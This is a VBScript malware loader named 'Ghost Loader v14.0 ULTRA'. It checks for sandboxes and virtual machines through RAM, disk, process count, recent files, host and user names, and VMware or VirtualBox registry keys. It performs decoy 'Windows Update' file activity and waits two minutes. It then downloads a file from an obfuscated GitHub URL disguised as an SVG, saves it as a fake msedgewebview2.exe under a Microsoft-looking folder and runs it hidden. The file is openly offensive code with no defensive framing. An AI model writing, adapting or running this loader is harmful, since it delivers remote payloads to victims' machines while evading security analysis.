' ============================================================
' Ghost Loader v14.0 ULTRA - Maximum Evasion
' Multi-stage delayed execution with extensive anti-analysis
' ============================================================
Option Explicit
On Error Resume Next

' ==================== CONFIGURATION ====================
Const DELAY_MINUTES = 2          ' Wait time before payload
Const MIN_RAM_GB = 2             ' Minimum RAM (filters VMs)
Const MIN_DISK_GB = 60           ' Minimum disk (filters sandboxes)
Const MIN_PROCESSES = 30         ' Minimum running processes
Const MIN_RECENT_FILES = 15      ' User activity indicator

' ==================== GLOBAL OBJECTS ====================
Dim ws, fs, wmi, net, sh
Set ws = CreateObject("WScript.Shell")
Set fs = CreateObject("Scripting.FileSystemObject")
Set wmi = GetObject("winmgmts:\\.\root\cimv2")
Set net = CreateObject("WScript.Network")
Set sh = CreateObject("Shell.Application")

' ==================== ANTI-SANDBOX CHECKS ====================
Function IsSandbox()
    IsSandbox = False
    
    ' Check 1: RAM size
    Dim mem, memQuery
    Set memQuery = wmi.ExecQuery("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem")
    For Each mem In memQuery
        If CLng(mem.TotalPhysicalMemory / 1073741824) < MIN_RAM_GB Then
            IsSandbox = True
            Exit Function
        End If
    Next
    
    ' Check 2: Disk size
    Dim disk
    For Each disk In fs.Drives
        If disk.DriveType = 2 And disk.IsReady Then
            If disk.TotalSize / 1073741824 < MIN_DISK_GB Then
                IsSandbox = True
                Exit Function
            End If
        End If
    Next
    
    ' Check 3: Process count
    Dim procs
    Set procs = wmi.ExecQuery("SELECT * FROM Win32_Process")
    If procs.Count < MIN_PROCESSES Then
        IsSandbox = True
        Exit Function
    End If
    
    ' Check 4: Recent files (user activity)
    Dim recentPath, recentFolder
    recentPath = ws.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Recent"
    If fs.FolderExists(recentPath) Then
        Set recentFolder = fs.GetFolder(recentPath)
        If recentFolder.Files.Count < MIN_RECENT_FILES Then
            IsSandbox = True
            Exit Function
        End If
    End If
    
    ' Check 5: Computer name patterns (sandbox indicators)
    Dim compName
    compName = LCase(net.ComputerName)
    If InStr(compName, "sandbox") > 0 Or InStr(compName, "malware") > 0 Or InStr(compName, "virus") > 0 Or InStr(compName, "sample") > 0 Then
        IsSandbox = True
        Exit Function
    End If
    
    ' Check 6: Username patterns
    Dim userName
    userName = LCase(net.UserName)
    If InStr(userName, "admin") > 0 Or InStr(userName, "test") > 0 Or InStr(userName, "user") > 0 Or Len(userName) < 3 Then
        IsSandbox = True
        Exit Function
    End If
    
    ' Check 7: VM detection (registry)
    Dim vmCheck
    vmCheck = ws.RegRead("HKLM\SOFTWARE\VMware, Inc.\VMware Tools\InstallPath")
    If Err.Number = 0 Then
        IsSandbox = True
        Err.Clear
        Exit Function
    End If
    Err.Clear
    
    vmCheck = ws.RegRead("HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions")
    If Err.Number = 0 Then
        IsSandbox = True
        Err.Clear
        Exit Function
    End If
    Err.Clear
End Function

' ==================== DECOY OPERATIONS ====================
Sub PerformDecoyOperations()
    Dim i, dummy, tempFile
    
    ' Fake file operations
    For i = 1 To 10
        dummy = fs.GetSpecialFolder(2).Path
        dummy = ws.ExpandEnvironmentStrings("%TEMP%")
        dummy = ws.ExpandEnvironmentStrings("%USERPROFILE%")
    Next
    
    ' Fake registry reads
    dummy = ws.RegRead("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName")
    dummy = ws.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Desktop")
    
    ' Create decoy log
    tempFile = ws.ExpandEnvironmentStrings("%TEMP%") & "\WindowsUpdate_" & Year(Now) & Month(Now) & ".log"
    Dim ts
    Set ts = fs.CreateTextFile(tempFile, True)
    ts.WriteLine "Microsoft Windows Update Service"
    ts.WriteLine "Check Time: " & Now
    ts.WriteLine "Result: No updates available"
    ts.Close
    
    WScript.Sleep 500
    fs.DeleteFile tempFile, True
End Sub

' ==================== DELAYED EXECUTION ====================
Sub WaitWithActivity()
    Dim i, totalSeconds, dummy
    totalSeconds = DELAY_MINUTES * 60
    
    For i = 1 To totalSeconds
        WScript.Sleep 1000
        
        ' Periodic activity to seem legitimate
        If i Mod 30 = 0 Then
            dummy = fs.GetSpecialFolder(2).Path
            dummy = Now
        End If
    Next
End Sub

' ==================== MAIN PAYLOAD ====================
Sub ExecutePayload()
    Dim url, destDir, destFile, destPath
    Dim xhr, stm
    
    ' Obfuscated URL construction
    Dim u1, u2, u3, u4, u5
    u1 = "https://raw.githu"
    u2 = "busercontent.com/"
    u3 = "sophieduval/"
    u4 = "der/main/"
    u5 = "logo.svg"
    url = u1 & u2 & u3 & u4 & u5
    
    ' Legitimate-looking path
    destDir = ws.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\EdgeWebView\Application"
    If Not fs.FolderExists(destDir) Then
        fs.CreateFolder ws.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\EdgeWebView"
        fs.CreateFolder destDir
    End If
    
    destFile = "msedgewebview2.exe"
    destPath = destDir & "\" & destFile
    
    ' Download
    Set xhr = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xhr.SetTimeouts 60000, 60000, 60000, 60000
    xhr.Open "GET", url, False
    xhr.setRequestHeader "User-Agent", "Microsoft-CryptoAPI/10.0"
    xhr.Send
    
    If xhr.Status = 200 Then
        Set stm = CreateObject("ADODB.Stream")
        stm.Type = 1
        stm.Open
        stm.Write xhr.responseBody
        stm.SaveToFile destPath, 2
        stm.Close
        Set stm = Nothing
        
        ' Execute hidden
        If fs.FileExists(destPath) Then
            ws.Run """" & destPath & """", 0, False
        End If
    End If
    
    Set xhr = Nothing
End Sub

' ==================== MAIN ENTRY ====================
Sub Main()
    ' Phase 1: Environment check
    If IsSandbox() Then
        WScript.Quit 0
    End If
    
    ' Phase 2: Decoy operations
    PerformDecoyOperations()
    
    ' Phase 3: Long delay
    WaitWithActivity()
    
    ' Phase 4: Execute payload
    ExecutePayload()
End Sub

' Run
Main

' Cleanup
Set ws = Nothing
Set fs = Nothing
Set wmi = Nothing
Set net = Nothing
Set sh = Nothing
